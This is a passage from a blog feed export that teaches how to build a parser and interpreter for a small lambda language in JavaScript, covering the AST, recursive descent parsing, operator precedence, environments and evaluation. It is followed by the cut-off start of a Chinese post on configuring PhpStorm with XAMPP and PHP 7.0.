<p>We now have sufficiently powerful tools to easily write the parser, but first I’d recommend you to look at the description of the AST.</p>
<h2 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h2><pre><code>num &#123; type: &quot;num&quot;, value: NUMBER &#125;
str &#123; type: &quot;str&quot;, value: STRING &#125;
bool &#123; type: &quot;bool&quot;, value: true or false &#125;
var &#123; type: &quot;var&quot;, value: NAME &#125;
lambda &#123; type: &quot;lambda&quot;, vars: [ NAME... ], body: AST &#125;
call &#123; type: &quot;call&quot;, func: AST, args: [ AST... ] &#125;
if &#123; type: &quot;if&quot;, cond: AST, then: AST, else: AST &#125;
assign &#123; type: &quot;assign&quot;, operator: &quot;=&quot;, left: AST, right: AST &#125;
binary &#123; type: &quot;binary&quot;, operator: OPERATOR, left: AST, right: AST &#125;
prog &#123; type: &quot;prog&quot;, prog: [ AST... ] &#125;
let &#123; type: &quot;let&quot;, vars: [ VARS... ], body: AST &#125;
</code></pre>
<p>Example:</p>
<pre><code>let (a = 10, b = a * 10) &#123;
  a + b;
&#125;
</code></pre>
<p>To:</p>
<pre><code>&#123;
  &quot;type&quot;: &quot;let&quot;,
  &quot;vars&quot;: [
    &#123;
      &quot;name&quot;: &quot;a&quot;,
      &quot;def&quot;: &#123; &quot;type&quot;: &quot;num&quot;, &quot;value&quot;: 10 &#125;
    &#125;,
    &#123;
      &quot;name&quot;: &quot;b&quot;,
      &quot;def&quot;: &#123;
        &quot;type&quot;: &quot;binary&quot;,
        &quot;operator&quot;: &quot;*&quot;,
        &quot;left&quot;: &#123; &quot;type&quot;: &quot;var&quot;, &quot;value&quot;: &quot;a&quot; &#125;,
        &quot;right&quot;: &#123; &quot;type&quot;: &quot;num&quot;, &quot;value&quot;: 10 &#125;
      &#125;
    &#125;
  ],
  &quot;body&quot;: &#123;
    &quot;type&quot;: &quot;binary&quot;,
    &quot;operator&quot;: &quot;+&quot;,
    &quot;left&quot;: &#123; &quot;type&quot;: &quot;var&quot;, &quot;value&quot;: &quot;a&quot; &#125;,
    &quot;right&quot;: &#123; &quot;type&quot;: &quot;var&quot;, &quot;value&quot;: &quot;b&quot; &#125;
  &#125;
&#125;
</code></pre>
<h2 id="The-parser"><a href="#The-parser" class="headerlink" title="The parser"></a>The parser</h2><p>The parser creates AST nodes that are described in the AST section. Thanks to the work we did in the tokenizer, the parser operates on a stream of tokens instead of dealing with individual characters. It still defines many helpers to keep complexity down. I’ll discuss here the main functions that comprise the parser. Let’s start with a high level one, the lambda parser:</p>
<pre><code>function parse_lambda() &#123;
    return &#123;
        type: &quot;lambda&quot;,
        vars: delimited(&quot;(&quot;, &quot;)&quot;, &quot;,&quot;, parse_varname),
        body: parse_expression()
    &#125;;
&#125;
</code></pre>
<p>This function will be invoked when the lambda keyword has already been seen and “eaten” from the input, so all it cares for is to parse the <strong>argument names</strong>; but they’re in parentheses and delimited by commas. Rather than placing that code in <code>parse_lambda</code>, I preferred to write a delimited function that takes these arguments: the start token, the end token, the separator, and a function which parses whatever must be between those start&#x2F;end tokens. In this case, it’s <code>parse_varname</code>, which takes care to throw an error if it encounters anything which doesn’t look like a variable. The body of the function is an expression, so we get it with parse_expression. delimited is a bit lower-level:</p>
<pre><code>function delimited(start, stop, separator, parser) &#123;
    var a = [], first = true;
    skip_punc(start);
    while (!input.eof()) &#123;
        if (is_punc(stop)) break;
        if (first) first = false; else skip_punc(separator);
        if (is_punc(stop)) break; // the last separator can be missing
        a.push(parser());
    &#125;
    skip_punc(stop);
    return a;
&#125;
</code></pre>
<p>As you can see, it uses more utilities: <code>is_punc</code> and <code>skip_punc</code>. The former will return true if the current token is the given punctuation sign (without “eating” it), while <code>skip_punc</code> will ensure that the current token is that punctuation (throws an error otherwise) and will discard it from the input. The function that parses the whole program is probably the simplest:</p>
<pre><code>function parse_toplevel() &#123;
    var prog = [];
    while (!input.eof()) &#123;
        prog.push(parse_expression());
        if (!input.eof()) skip_punc(&quot;;&quot;);
    &#125;
    return &#123; type: &quot;prog&quot;, prog: prog &#125;;
&#125;
</code></pre>
<p>Since we have no statements, we simply call <code>parse_expression()</code> and read expressions until we get to the end of the input. Using <code>skip_punc(&quot;;&quot;)</code> we demand semicolons between these expressions. Another simple example: <code>parse_if()</code>:</p>
<pre><code>function parse_if() &#123;
    skip_kw(&quot;if&quot;);
    var cond = parse_expression();
    if (!is_punc(&quot;&#123;&quot;)) skip_kw(&quot;then&quot;);
    var then = parse_expression();
    var ret = &#123; type: &quot;if&quot;, cond: cond, then: then &#125;;
    if (is_kw(&quot;else&quot;)) &#123;
        input.next();
        ret.else = parse_expression();
    &#125;
    return ret;
&#125;
</code></pre>
<p>It skips over the if keyword with <code>skip_kw</code> (and this throws an error if the current token is not the given keyword), reads the condition using <code>parse_expression()</code>. Next, if the consequent branch doesn’t start with a { we require the keyword then to be present (I feel like the syntax is too scarce without it). The branches are just expressions, so again we use parse_expression() for them. The else branch is optional so we need to check if the keyword is present before parsing it. Having many small utilities helps a lot in keeping the code simple. We almost write the parser like we had a high level language dedicated for parsing. All these functions are “mutually recursive”, e.g.: there’s a <code>parse_atom()</code> function which is the main dispatcher — based on the current token it calls other functions. One of them is <code>parse_if()</code> (called when the current token is if) and that in turn calls <code>parse_expression()</code>. But <code>parse_expression()</code> calls <code>parse_atom()</code>. The reason why there’s no infinite loop is that at each step, one function or another will advance at least one token. This kind of parser is called a “recursive descent parser” and it’s probably the easiest kind to write manually. **Lower level: <code>parse_atom()</code> and <code>parse_expression()</code> ** parse_atom() does the main dispatching job, depending on the current token:</p>
<pre><code>function parse_atom() &#123;
    return maybe_call(function()&#123;
        if (is_punc(&quot;(&quot;)) &#123;
            input.next();
            var exp = parse_expression();
            skip_punc(&quot;)&quot;);
            return exp;
        &#125;
        if (is_punc(&quot;&#123;&quot;)) return parse_prog();
        if (is_kw(&quot;if&quot;)) return parse_if();
        if (is_kw(&quot;true&quot;) || is_kw(&quot;false&quot;)) return parse_bool();
        if (is_kw(&quot;lambda&quot;) || is_kw(&quot;λ&quot;)) &#123;
            input.next();
            return parse_lambda();
        &#125;
        var tok = input.next();
        if (tok.type == &quot;var&quot; || tok.type == &quot;num&quot; || tok.type == &quot;str&quot;)
            return tok;
        unexpected();
    &#125;);
&#125;
</code></pre>
<p>If it sees an open paren, then it must be a parenthesized expression — thus, skip over paren, call parse_expression() and expect a closing paren. If it sees some keyword, it calls the appropriate parser function. If it sees a constant or an identifier, it’s just returned as is. And if nothing works, unexpected() will throw an error. When an atomic expression is expected and it sees {, it calls parse_prog to parse a sequence of expressions. That’s defined below. It will do some minor optimization at this point — if the prog is empty, then it just returns FALSE. If it has a single expression, it is returned instead of a “prog” node. Otherwise it returns a “prog” node containing the expressions.</p>
<pre><code>// we&#39;re going to use the FALSE node in various places,
// so I&#39;m making it a global.
var FALSE = &#123; type: &quot;bool&quot;, value: false &#125;;

function parse_prog() &#123;
    var prog = delimited(&quot;&#123;&quot;, &quot;&#125;&quot;, &quot;;&quot;, parse_expression);
    if (prog.length == 0) return FALSE;
    if (prog.length == 1) return prog[0];
    return &#123; type: &quot;prog&quot;, prog: prog &#125;;
&#125;
</code></pre>
<p>Here’s the <code>parse_expression()</code> function. Contrary to <code>parse_atom()</code>, this one will extend an expression as much as possible to the right using <code>maybe_binary()</code>, which is explained below.</p>
<pre><code>function parse_expression() &#123;
    return maybe_call(function()&#123;
        return maybe_binary(parse_atom(), 0);
    &#125;);
&#125;
</code></pre>
<h3 id="The-maybe-functions"><a href="#The-maybe-functions" class="headerlink" title="The maybe_ functions*"></a><em><em>The maybe_</em> functions</em>*</h3><p>These functions check what follows after an expression in order to decide whether to wrap that expression in another node, or just return it as is. <code>maybe_call()</code> is very simple. It receives a function that is expected to parse the current expression. If after that expression it sees a ( punctuation token, then it must be a “call” node, which is what parse_call() makes (included below). Notice again how delimited() comes in handy for reading the argument list.</p>
<pre><code>function maybe_call(expr) &#123;
    expr = expr();
    return is_punc(&quot;(&quot;) ? parse_call(expr) : expr;
&#125;

function parse_call(func) &#123;
    return &#123;
        type: &quot;call&quot;,
        func: func,
        args: delimited(&quot;(&quot;, &quot;)&quot;, &quot;,&quot;, parse_expression)
    &#125;;
&#125;
</code></pre>
<h4 id="Operator-precedence"><a href="#Operator-precedence" class="headerlink" title="Operator precedence"></a>Operator precedence</h4><p><code>maybe_binary(left, my_prec)</code> is used to compose binary expressions like 1 + 2 * 3. The trick to parse them properly is to correctly define the operator precedence, so we’ll start with that:</p>
<pre><code>var PRECEDENCE = &#123;
    &quot;=&quot;: 1,
    &quot;||&quot;: 2,
    &quot;&amp;&amp;&quot;: 3,
    &quot;&lt;&quot;: 7, &quot;&gt;&quot;: 7, &quot;&lt;=&quot;: 7, &quot;&gt;=&quot;: 7, &quot;==&quot;: 7, &quot;!=&quot;: 7,
    &quot;+&quot;: 10, &quot;-&quot;: 10,
    &quot;*&quot;: 20, &quot;/&quot;: 20, &quot;%&quot;: 20,
&#125;;
</code></pre>
<p>This says that * binds tighter than +, so an expression like 1 + 2 * 3 must be read as (1 + (2 * 3)) instead of ((1 + 2) * 3), which would be the normal left-to-right order in which the parser operates. The trick is to read an atomic expression (only the 1) and pass it to <code>maybe_binary()</code> (the left argument), along with the current precedence <code>(the my_prec)</code>. maybe_binary will look at what follows. If it doesn’t see an operator, or if it has a smaller priority, then left is returned as is. If it’s an operator that has a higher precedence than ours, then it wraps left in a new “binary” node, and for the right side it repeats the trick at the new precedence level (*):</p>
<pre><code>function maybe_binary(left, my_prec) &#123;
    var tok = is_op();
    if (tok) &#123;
        var his_prec = PRECEDENCE[tok.value];
        if (his_prec &gt; my_prec) &#123;
            input.next();
            var right = maybe_binary(parse_atom(), his_prec) // (*);
            var binary = &#123;
                type     : tok.value == &quot;=&quot; ? &quot;assign&quot; : &quot;binary&quot;,
                operator : tok.value,
                left     : left,
                right    : right
            &#125;;
            return maybe_binary(binary, my_prec);
        &#125;
    &#125;
    return left;
&#125;
</code></pre>
<p>Note that before returning the binary expression we must also call <code>maybe_binary</code> at the old precedence level (my_prec), in order to wrap the expression in another one, should an operator with a higher precedence follow. If all this is confusing, read the code again and again (perhaps try to execute it mentally on some input expressions) until you get it. Finally, since my_prec is initially zero, any operator will trigger the building of a “binary” node (or “assign” when the operator is &#x3D;). There are a few more functions in the parser, so I’m including the whole parse function below. Click “Show code” to display it (about 150 lines).</p>
<pre><code>var FALSE = &#123; type: &quot;bool&quot;, value: false &#125;;
function parse(input) &#123;
    var PRECEDENCE = &#123;
        &quot;=&quot;: 1,
        &quot;||&quot;: 2,
        &quot;&amp;&amp;&quot;: 3,
        &quot;&lt;&quot;: 7, &quot;&gt;&quot;: 7, &quot;&lt;=&quot;: 7, &quot;&gt;=&quot;: 7, &quot;==&quot;: 7, &quot;!=&quot;: 7,
        &quot;+&quot;: 10, &quot;-&quot;: 10,
        &quot;*&quot;: 20, &quot;/&quot;: 20, &quot;%&quot;: 20,
    &#125;;
    return parse_toplevel();
    function is_punc(ch) &#123;
        var tok = input.peek();
        return tok &amp;&amp; tok.type == &quot;punc&quot; &amp;&amp; (!ch || tok.value == ch) &amp;&amp; tok;
    &#125;
    function is_kw(kw) &#123;
        var tok = input.peek();
        return tok &amp;&amp; tok.type == &quot;kw&quot; &amp;&amp; (!kw || tok.value == kw) &amp;&amp; tok;
    &#125;
    function is_op(op) &#123;
        var tok = input.peek();
        return tok &amp;&amp; tok.type == &quot;op&quot; &amp;&amp; (!op || tok.value == op) &amp;&amp; tok;
    &#125;
    function skip_punc(ch) &#123;
        if (is_punc(ch)) input.next();
        else input.croak(&quot;Expecting punctuation: \&quot;&quot; + ch + &quot;\&quot;&quot;);
    &#125;
    function skip_kw(kw) &#123;
        if (is_kw(kw)) input.next();
        else input.croak(&quot;Expecting keyword: \&quot;&quot; + kw + &quot;\&quot;&quot;);
    &#125;
    function skip_op(op) &#123;
        if (is_op(op)) input.next();
        else input.croak(&quot;Expecting operator: \&quot;&quot; + op + &quot;\&quot;&quot;);
    &#125;
    function unexpected() &#123;
        input.croak(&quot;Unexpected token: &quot; + JSON.stringify(input.peek()));
    &#125;
    function maybe_binary(left, my_prec) &#123;
        var tok = is_op();
        if (tok) &#123;
            var his_prec = PRECEDENCE[tok.value];
            if (his_prec &gt; my_prec) &#123;
                input.next();
                return maybe_binary(&#123;
                    type     : tok.value == &quot;=&quot; ? &quot;assign&quot; : &quot;binary&quot;,
                    operator : tok.value,
                    left     : left,
                    right    : maybe_binary(parse_atom(), his_prec)
                &#125;, my_prec);
            &#125;
        &#125;
        return left;
    &#125;
    function delimited(start, stop, separator, parser) &#123;
        var a = [], first = true;
        skip_punc(start);
        while (!input.eof()) &#123;
            if (is_punc(stop)) break;
            if (first) first = false; else skip_punc(separator);
            if (is_punc(stop)) break;
            a.push(parser());
        &#125;
        skip_punc(stop);
        return a;
    &#125;
    function parse_call(func) &#123;
        return &#123;
            type: &quot;call&quot;,
            func: func,
            args: delimited(&quot;(&quot;, &quot;)&quot;, &quot;,&quot;, parse_expression),
        &#125;;
    &#125;
    function parse_varname() &#123;
        var name = input.next();
        if (name.type != &quot;var&quot;) input.croak(&quot;Expecting variable name&quot;);
        return name.value;
    &#125;
    function parse_if() &#123;
        skip_kw(&quot;if&quot;);
        var cond = parse_expression();
        if (!is_punc(&quot;&#123;&quot;)) skip_kw(&quot;then&quot;);
        var then = parse_expression();
        var ret = &#123;
            type: &quot;if&quot;,
            cond: cond,
            then: then,
        &#125;;
        if (is_kw(&quot;else&quot;)) &#123;
            input.next();
            ret.else = parse_expression();
        &#125;
        return ret;
    &#125;
    function parse_lambda() &#123;
        return &#123;
            type: &quot;lambda&quot;,
            vars: delimited(&quot;(&quot;, &quot;)&quot;, &quot;,&quot;, parse_varname),
            body: parse_expression()
        &#125;;
    &#125;
    function parse_bool() &#123;
        return &#123;
            type  : &quot;bool&quot;,
            value : input.next().value == &quot;true&quot;
        &#125;;
    &#125;
    function maybe_call(expr) &#123;
        expr = expr();
        return is_punc(&quot;(&quot;) ? parse_call(expr) : expr;
    &#125;
    function parse_atom() &#123;
        return maybe_call(function()&#123;
            if (is_punc(&quot;(&quot;)) &#123;
                input.next();
                var exp = parse_expression();
                skip_punc(&quot;)&quot;);
                return exp;
            &#125;
            if (is_punc(&quot;&#123;&quot;)) return parse_prog();
            if (is_kw(&quot;if&quot;)) return parse_if();
            if (is_kw(&quot;true&quot;) || is_kw(&quot;false&quot;)) return parse_bool();
            if (is_kw(&quot;lambda&quot;) || is_kw(&quot;λ&quot;)) &#123;
                input.next();
                return parse_lambda();
            &#125;
            var tok = input.next();
            if (tok.type == &quot;var&quot; || tok.type == &quot;num&quot; || tok.type == &quot;str&quot;)
                return tok;
            unexpected();
        &#125;);
    &#125;
    function parse_toplevel() &#123;
        var prog = [];
        while (!input.eof()) &#123;
            prog.push(parse_expression());
            if (!input.eof()) skip_punc(&quot;;&quot;);
        &#125;
        return &#123; type: &quot;prog&quot;, prog: prog &#125;;
    &#125;
    function parse_prog() &#123;
        var prog = delimited(&quot;&#123;&quot;, &quot;&#125;&quot;, &quot;;&quot;, parse_expression);
        if (prog.length == 0) return FALSE;
        if (prog.length == 1) return prog[0];
        return &#123; type: &quot;prog&quot;, prog: prog &#125;;
    &#125;
    function parse_expression() &#123;
        return maybe_call(function()&#123;
            return maybe_binary(parse_atom(), 0);
        &#125;);
    &#125;
&#125;
</code></pre>
<h3 id="Credit"><a href="#Credit" class="headerlink" title="Credit"></a>Credit</h3><p>The moment I understood how to write a non-trivial parser occurred while studying Marijn Haverbeke’s parse-js library (Common Lisp). The parser above, although for a much simpler language, is modeled after his code.</p>
<hr>
<h2 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h2><p>To recap: so far we wrote 3 functions: InputStream, TokenStream and parse. To get an AST from a piece of code now we can do the following:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">var ast = parse(TokenStream(InputStream(code)));</span><br></pre></td></tr></table></figure></div>

<p>Writing an interpreter is easier than the parser. We just have to walk the AST, executing expressions in their normal order.</p>
<h2 id="The-environment"><a href="#The-environment" class="headerlink" title="The environment"></a>The environment</h2><p>The key to correct execution is to properly maintain the environment — a structure holding variable bindings. It will be passed as an argument to our evaluate function. Each time we enter a “lambda” node we must extend the environment with new variables (function’s arguments) and initialize them with values passed at run time. If an argument shadows a variable from the outer scope (I’ll use words scope and environment interchangeably here) we must be careful to restore the previous value when we leave the function.</p>
<p>The simplest way to implement this is using JavaScript’s prototype inheritance. When we enter a function we’ll create a new environment, set its prototype to the outer (parent) environment and evaluate the function body in the new one. This way when we exit we need not do anything — the outer env will already contain any shadowed bindings.</p>
<p>Here’s the definition of the Environment object:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function Environment(parent) &#123;</span><br><span class="line">    this.vars = Object.create(parent ? parent.vars : null);</span><br><span class="line">    this.parent = parent;</span><br><span class="line">&#125;</span><br><span class="line">Environment.prototype = &#123;</span><br><span class="line">    extend: function() &#123;</span><br><span class="line">        return new Environment(this);</span><br><span class="line">    &#125;,</span><br><span class="line">    lookup: function(name) &#123;</span><br><span class="line">        var scope = this;</span><br><span class="line">        while (scope) &#123;</span><br><span class="line">            if (Object.prototype.hasOwnProperty.call(scope.vars, name))</span><br><span class="line">                return scope;</span><br><span class="line">            scope = scope.parent;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    get: function(name) &#123;</span><br><span class="line">        if (name in this.vars)</span><br><span class="line">            return this.vars[name];</span><br><span class="line">        throw new Error(&quot;Undefined variable &quot; + name);</span><br><span class="line">    &#125;,</span><br><span class="line">    set: function(name, value) &#123;</span><br><span class="line">        var scope = this.lookup(name);</span><br><span class="line">        // let&#x27;s not allow defining globals from a nested environment</span><br><span class="line">        if (!scope &amp;&amp; this.parent)</span><br><span class="line">            throw new Error(&quot;Undefined variable &quot; + name);</span><br><span class="line">        return (scope || this).vars[name] = value;</span><br><span class="line">    &#125;,</span><br><span class="line">    def: function(name, value) &#123;</span><br><span class="line">        return this.vars[name] = value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>


<p>An Environment object has a parent, which points to the parent scope. The parent will be null for the global scope. And it has a vars property which holds the variable bindings. This is initialized as Object.create(null) for the toplevel (global) scope, or Object.create(parent.vars) for subscopes, in order to “see” the current bindings via prototypal inheritance.</p>
<p>There are the following methods:</p>
<ul>
<li><p>extend() — to create a subscope.</p>
</li>
<li><p>lookup(name) — to find the scope where the variable with the given name is defined.</p>
</li>
<li><p>get(name) — to get the current value of a variable. Throws an error if the variable is not defined.</p>
</li>
<li><p>set(name, value) — to set the value of a variable. This needs to lookup the actual scope where the variable is defined. If it’s not found and we’re not in the global scope, throws an error.</p>
</li>
<li><p>def(name, value) — this creates (or shadows, or overwrites) a variable in the current scope.</p>
</li>
</ul>
<h2 id="The-evaluate-function"><a href="#The-evaluate-function" class="headerlink" title="The evaluate function"></a>The evaluate function</h2><p>Now that we have the Environment we can jump to the main problem. This function will be a big switch statement, dispatching by node type, containing logic for evaluating each kind of node. I’ll comment on each case:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function evaluate(exp, env) &#123;</span><br><span class="line">    switch (exp.type) &#123;</span><br></pre></td></tr></table></figure></div>

<p>For constant nodes, we just return their value:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">case &quot;num&quot;:</span><br><span class="line">case &quot;str&quot;:</span><br><span class="line">case &quot;bool&quot;:</span><br><span class="line">  return exp.value;</span><br></pre></td></tr></table></figure></div>

<p>Variables are fetched from the environment. Remember that “var” tokens contain the name in the value property:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">case &quot;var&quot;:</span><br><span class="line">  return env.get(exp.value);</span><br></pre></td></tr></table></figure></div>

<p>For assignment, we need to check if the left side is a “var” token (if not, throw an error; we don’t support assignment to anything else for now). Then we use env.set to set the value. Note that the value needs to be computed first by calling evaluate recursively.</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">case &quot;assign&quot;:</span><br><span class="line">  if (exp.left.type != &quot;var&quot;)</span><br><span class="line">      throw new Error(&quot;Cannot assign to &quot; + JSON.stringify(exp.left));</span><br><span class="line">  return env.set(exp.left.value, evaluate(exp.right, env));</span><br></pre></td></tr></table></figure></div>

<p>A “binary” node needs to apply an operator to two operands. We’ll write the apply_op function later, it’s quite trivial. Again, we need to call the evaluator recursively to compute the left and right operands:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">case &quot;binary&quot;:</span><br><span class="line">  return apply_op(exp.operator,</span><br><span class="line">                  evaluate(exp.left, env),</span><br><span class="line">                  evaluate(exp.right, env));</span><br></pre></td></tr></table></figure></div>

<p>A “lambda” node will actually result in a JavaScript closure, so it will be callable from JavaScript just like an ordinary function. I wrote a make_lambda function, which I’ll define later:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">case &quot;lambda&quot;:</span><br><span class="line">  return make_lambda(env, exp);</span><br></pre></td></tr></table></figure></div>

<p>Evaluating an “if” node is simple: first evaluate the condition. If it’s not false then evaluate the “then” branch and return its value. Otherwise, evaluate the “else” branch, if present, or return false.</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">case &quot;if&quot;:</span><br><span class="line">  var cond = evaluate(exp.cond, env);</span><br><span class="line">  if (cond !== false) return evaluate(exp.then, env);</span><br><span class="line">  return exp.else ? evaluate(exp.else, env) : false;</span><br></pre></td></tr></table></figure></div>

<p>A “prog” is a sequence of expressions. We just evaluate them in order and return the value of the last one. For an empty sequence, the return value is initialized to false.</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">case &quot;prog&quot;:</span><br><span class="line">  var val = false;</span><br><span class="line">  exp.prog.forEach(function(exp)&#123; val = evaluate(exp, env) &#125;);</span><br><span class="line">  return val;</span><br></pre></td></tr></table></figure></div>

<p>For a “call” node we need to call a function. First we evaluate the func, which should return a normal JS function, then we evaluate the args and apply that function.</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">case &quot;call&quot;:</span><br><span class="line">  var func = evaluate(exp.func, env);</span><br><span class="line">  return func.apply(null, exp.args.map(function(arg)&#123;</span><br><span class="line">      return evaluate(arg, env);</span><br><span class="line">  &#125;));</span><br></pre></td></tr></table></figure></div>

<p>We should never get here, but just in case we add new node types in the parser and we forget to update the evaluator, let’s throw a clear error.</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">      default:</span><br><span class="line">        throw new Error(&quot;I don&#x27;t know how to evaluate &quot; + exp.type);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>This was the core of the evaluator and as you can see it’s really simple. We still need to write two more functions, let’s start with apply_op as it’s the easiest one:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function apply_op(op, a, b) &#123;</span><br><span class="line">    function num(x) &#123;</span><br><span class="line">        if (typeof x != &quot;number&quot;)</span><br><span class="line">            throw new Error(&quot;Expected number but got &quot; + x);</span><br><span class="line">        return x;</span><br><span class="line">    &#125;</span><br><span class="line">    function div(x) &#123;</span><br><span class="line">        if (num(x) == 0)</span><br><span class="line">            throw new Error(&quot;Divide by zero&quot;);</span><br><span class="line">        return x;</span><br><span class="line">    &#125;</span><br><span class="line">    switch (op) &#123;</span><br><span class="line">      case &quot;+&quot;  : return num(a) + num(b);</span><br><span class="line">      case &quot;-&quot;  : return num(a) - num(b);</span><br><span class="line">      case &quot;*&quot;  : return num(a) * num(b);</span><br><span class="line">      case &quot;/&quot;  : return num(a) / div(b);</span><br><span class="line">      case &quot;%&quot;  : return num(a) % div(b);</span><br><span class="line">      case &quot;&amp;&amp;&quot; : return a !== false &amp;&amp; b;</span><br><span class="line">      case &quot;||&quot; : return a !== false ? a : b;</span><br><span class="line">      case &quot;&lt;&quot;  : return num(a) &lt; num(b);</span><br><span class="line">      case &quot;&gt;&quot;  : return num(a) &gt; num(b);</span><br><span class="line">      case &quot;&lt;=&quot; : return num(a) &lt;= num(b);</span><br><span class="line">      case &quot;&gt;=&quot; : return num(a) &gt;= num(b);</span><br><span class="line">      case &quot;==&quot; : return a === b;</span><br><span class="line">      case &quot;!=&quot; : return a !== b;</span><br><span class="line">    &#125;</span><br><span class="line">    throw new Error(&quot;Can&#x27;t apply operator &quot; + op);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>It receives the operator and the arguments. Just a boring switch to apply it. Unlike JavaScript, which applies any operator to any arguments and moves on whether that makes any sense or not, we require that the operands for numeric operators be numbers, and that a divizor is not zero, using the small helpers num and div. For strings we’ll define something else.</p>
<h2 id="make-lambda"><a href="#make-lambda" class="headerlink" title="make_lambda"></a>make_lambda</h2><p>The make_lambda is a bit subtle:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function make_lambda(env, exp) &#123;</span><br><span class="line">    function lambda() &#123;</span><br><span class="line">        var names = exp.vars;</span><br><span class="line">        var scope = env.extend();</span><br><span class="line">        for (var i = 0; i &lt; names.length; ++i)</span><br><span class="line">            scope.def(names[i], i &lt; arguments.length ? arguments[i] : false);</span><br><span class="line">        return evaluate(exp.body, scope);</span><br><span class="line">    &#125;</span><br><span class="line">    return lambda;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>As you can see, it returns a plain JavaScript function that encloses over the environment and the expression to evaluate. It’s important to understand that nothing happens when this closure is created — but when it’s called, it will extend the environment that it saved at creation time with the new bindings of arguments&#x2F;values (if less values are passed than the function’s argument list, the missing ones will get the value false). And then it just evaluates the body in the new scope.</p>
<h2 id="primitive-functions"><a href="#primitive-functions" class="headerlink" title="primitive functions"></a>primitive functions</h2><p>You can observe that our language does not provide any means to interact with the outside world. In some code examples I’ve used some print and println functions, but they are not defined anywhere. These have to be defined as primitive functions (that is, we’ll write them in JavaScript and will insert them into the global environment).</p>
<p>To put it all together now, here’s a test program:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// some test code here</span><br><span class="line">var code = &quot;sum = lambda(x, y) x + y; print(sum(2, 3));&quot;;</span><br><span class="line"></span><br><span class="line">// remember, parse takes a TokenStream which takes an InputStream</span><br><span class="line">var ast = parse(TokenStream(InputStream(code)));</span><br><span class="line"></span><br><span class="line">// create the global environment</span><br><span class="line">var globalEnv = new Environment();</span><br><span class="line"></span><br><span class="line">// define the &quot;print&quot; primitive function</span><br><span class="line">globalEnv.def(&quot;print&quot;, function(txt)&#123;</span><br><span class="line">  console.log(txt);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// run the evaluator</span><br><span class="line">evaluate(ast, globalEnv); // will print 5</span><br></pre></td></tr></table></figure></div>

<p>Test:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;sum = lambda(x, y) x + y; println(sum(2, 3));&#x27; | node lambda-eval1.js</span><br></pre></td></tr></table></figure></div>



]]></content>
      <categories>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>parser</tag>
        <tag>atom</tag>
        <tag>expression</tag>
        <tag>lanauage</tag>
        <tag>operator</tag>
        <tag>parse</tag>
        <tag>precedence</tag>
      </tags>
  </entry>
  <entry>
    <title>PhpStorm 配置php7.0环境</title>
    <url>/2017/04/20/phpstorm/</url>
    <content><![CDATA[<p>php小白一个，配置phpstorm环境<br>网上的教程大都很老了所以来更一波</p>
<ol>
<li><p>下载xmapp7..0版本<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170420164910541?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="xampp"
                > 是的你没看错，就是32位<br>是的你没看错，我用了集成包而不是单独配<br>是的你没看错我下的是7.0版本而不是最新的版本 关于安装<br>只有一个要强调<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170420165236796?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="mysql"
                > 这个mysql必须要选上<br>无论你电脑装没装MySQL<br>可能有尝试过phpstudy的<br>就是那个装了之后那个自己的MySQL就会变红停止<br>这个不用担心<br>xampp不会影响，很稳 然后启动后要配置一下<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170420165552910?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="xampp"
